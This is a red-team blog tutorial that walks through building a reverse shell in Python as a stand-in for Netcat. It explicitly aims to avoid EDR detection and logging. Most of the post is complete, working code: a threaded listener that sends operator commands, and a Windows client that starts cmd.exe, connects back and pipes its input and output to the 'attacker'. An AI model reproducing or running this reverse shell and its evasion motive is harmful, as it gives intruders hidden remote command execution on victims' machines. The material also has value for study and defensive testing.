---
title:  "Create your own Netcat using Python"
header:
  teaser: "/assets/images/revshell.png"
categories:
  - Sockets
tags:
  - sockets
  - threading
  - netcat
  - server
  - python
  - client
  - AV
  - EDR
  - red team
  - elevationstation
---

**Update: 11/4/2024**

> It has recently come to my attention that out of all my blog posts, this one seems to be a community favorite and I'm pumped to hear it!  Thank you everyone for sharing your interest in this content!  If you have more ideas, general feedback, etc hit me up on my discord! I'd love to hear from you and talk more:

> [g3tsyst3m's discord server](https://discord.gg/bqDkEdDrQQ)

Why make your own version of Netcat?  Here's a few reasons:

- Windows Defender for Endpoint is at least one EDR solution I can confirm blocks/flags it if used on Windows.  I'm sure other EDR solutions detect it too
- Even if it doesn't get detected, it's likely getting logged somewhere and shipped to the orgs SIEM
- Sockets are the main backbone behind all things C2, reverse shells/shellcode, RCEs, etc.  So we should probably understand how they work!
- The most popular shellcode created using msfvenom is a reverse shell.  What happens when you can't create a reverse shell using msfvenom...

The above reasons are worthy of exploring how to make our own server and client socket scripts that accomplish the exact same thing Netcat accomplishes, minus the file transfer functionality.

Okay I'm done rambling, let's begin!

**The Server**
-

```python
import socket
import subprocess
import sys
import time
import threading
import asyncio
import io
import os
#import readline
import colorama
from colorama import Fore, Back, Style

host = "0.0.0.0" # No IP restrictions for the IP to be used for a connection
port = 4546 # the selected port we will use for listening for a connection 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #type of socket, in this case IPV4 addresses are expected to be used
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #allow reusing this socket for multiple connections
s.bind((host, port)) #bind to our set IP/port
s.listen(5) #  queue up as many as 5 connect requests before refusing additional connections
print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)

conn, addr = s.accept()
print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]}', Fore.WHITE)
```

This is a basic template for binding to your specified IP/port can be found in the code above.  That's it! The above code is all that is necessary to  bind to your IP/port and listen for remote connections. 

**The Client**
-

```python
import argparse
import socket
import subprocess
import sys
import threading
import os
import time
from win32com.shell import shell

host="127.0.0.1" # ip of the listening server we wish to connect to
port=4546 # port for the listening server we wish to connect to
    
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPV4 TCP/IP networking
try:
    client.connect((host, port)) #connect over to our server!
except:
    print("server/socket must have died...time to hop off") #self-explanatory
    os._exit(0)
```

This is a basic template for connecting to your listening server. It's even easier to write a client than it is writing the server code! 😸

**Code in Action!**

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/428f6d3e-9804-4a5d-830d-0b5ecd67a20d)
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/325823ae-4626-4b98-91d3-2855fa7c0603)

Okay...it's incredibly basic.  I get it.  Just wait...There's more. I'm using this as an opportunity to explain the basics all the way up to the actual shell being sent over to the server.  Hang in there!

**Enter-in: Python Threading!**

Now, we need a way to setup separate background "worker" threads that will receive and send data via our socket continually.  Python makes this a breeze! We will setup two threads:

- The first thread will run our code contained within the shellreceiver() function.  This function will continually be ready to receive our socket client's cmd shell returned STDOUT (the client's "shell" output).
- The second thread will run our code contained within the shellsender() function.  This function will continually be ready to send your commands you'd like executed on the client since the client will be running the cmd.exe shell. 

I hope that makes sense.  Admittedly it took me some time to finally understand how a shell works.  The example I'm building off of is how your classic reverse shell is executed.  Your victim executes the reverse shell client, which starts the `cmd.exe` process and pipes that output to your socket.  That is then sent to your listening server.  Once our listening server receives the shell output, we send our command back to the client to be executed.  The client is also in a listening state via threads btw, which we will see later.  Okay, let's see the updated code:

**Updated Server Socket code**
-

```python
import socket
import subprocess
import sys
import time
import threading
import asyncio
import io
import os
#import readline
import colorama
from colorama import Fore, Back, Style

#receive the cmd.exe shell command output from the client
def shellreceiver(conn):
    while True:
        try:
            data=conn.recv(1)
            print(data.decode(), end="", flush=True)
        except:
            print("server/socket must have died...time to hop off")
            conn.close()
            os._exit(0)

#send our command we'd like executed on the victim/client!
def shellsender(conn):
    while True:
        mycmd=input("")
        mycmd=mycmd+"\n"
        try:
            conn.send(mycmd.encode())
        except:
            print("server/socket must have died...time to hop off")
            conn.close()
            os._exit(0) 

host = "0.0.0.0"
port = 4546

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)

conn, addr = s.accept()
print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]}', Fore.WHITE)

#New code starts here. This initiates our threads!
##################################################
s2p_thread = threading.Thread(target=shellreceiver, args=[conn, ])
s2p_thread.daemon = True
s2p_thread.start()

s2p_thread = threading.Thread(target=shellsender, args=[conn, ])
s2p_thread.daemon = True
s2p_thread.start()
##################################################

#continuous loop
while True:
    time.sleep(1)
```

Now, Let's revisit the client code and make all the necessary adjustments to include threading there too. 

**Updated Client Code**
-

```python
import argparse
import socket
import subprocess
import sys
import threading
import os
import time
from win32com.shell import shell

#cmd.exe has now executed our command this client received from the server. Now we send the STDOUT result of that command after it ran via cmd.exe!
def shellstdout_sender(client, myshellproc):
    
    while True:
        output=myshellproc.stdout.read1()
        try:
            client.send(output)
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0) 
#send errors (example: you typed 'net usr' intead of 'net user'. This will show you the error produced by cmd.exe    
def shellstderr_sender(client, myshellproc):
    
    while True:
        output=myshellproc.stderr.read1()
        try:
            client.send(output)
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0)

#This function will take the command the server sent to this client, write it to the cmd.exe console, and execute it
#The shellsender() function will send the results of the executed command back to the server / attacker        
def shellreceiver(client, myshellproc):
    while True:
        try:
            data = client.recv(1024)
            if len(data) > 0:
                #if you type :leave: in the server/attacker console it closes the connection.  similar to 'exit' but just a custom version of that that I like to implement
                if ":leave:" in data.decode("UTF-8"):
                    subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
                    client.close()
                    os._exit(0) 
                myshellproc.stdin.write(data)
                myshellproc.stdin.flush()
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0)

# start the command shell and pipe it's contents to stdin, stout, and stderr        
myshellproc = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

host="127.0.0.1"
port=4546
    
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect((host, port))
except:
    print("server/socket must have died...time to hop off")
    os._exit(0)

#This initiates our function threads!
###############################################
s2p_thread = threading.Thread(target=shellstdout_sender, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()

s2p_thread = threading.Thread(target=shellstderr_sender, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()

s2p_thread = threading.Thread(target=shellreceiver, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()
###############################################

#continuous loop
while True:
    time.sleep(1)
```

**Server/Client Demo**
-

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/f757cb44-b95f-4e6f-a748-4a8368ed4765)
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/fcb1e665-0fa8-42cb-9088-b53fbb611395)

If you made it this far then congrats!  Sorry I didn't comment more in the code.  I only have so much time that I can commit to these writeups but I tried to get the primary aspects of the server/client reverse shell functionality covered in enough detail that you can write your own and build off of this one 😸

If you'd like the raw code, just go here and you can grab both the server and the client: [server/client code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2023-08-19-Create%20your%20own%20Netcat%20using%20Python)

As always, thank you for reading!
